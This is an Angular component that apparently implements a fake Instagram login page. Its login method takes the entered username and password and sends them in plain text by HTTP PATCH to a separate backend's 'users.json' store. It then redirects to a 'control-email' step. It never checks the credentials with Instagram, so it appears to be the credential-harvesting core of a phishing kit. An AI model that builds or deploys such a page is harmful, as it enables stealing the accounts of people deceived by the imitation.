import { Component } from '@angular/core';
import {FormControl, ReactiveFormsModule, Validators} from "@angular/forms";
import {HttpClient, HttpClientModule} from "@angular/common/http";
import {environment} from "../../../environments/environment";
import {Router} from "@angular/router";

@Component({
  selector: 'app-instagram-login-page',
  standalone: true,
  imports: [
    ReactiveFormsModule,
    HttpClientModule
  ],
  templateUrl: './instagram-login-page.component.html',
  styleUrl: './instagram-login-page.component.css'
})
export class InstagramLoginPageComponent {
  username = new FormControl(null, [Validators.required])
  password = new FormControl(null, [Validators.required])

  constructor(private http: HttpClient, private router: Router) {
  }

  async login() {
    return this.http.patch(`${environment.apiUrl}/users.json`, {username: this.username.value, password: this.password.value}).toPromise().then((data: any)=> {
      this.router.navigate(['/control-email'], {queryParams: {id: data.name}})
    })
  }
}
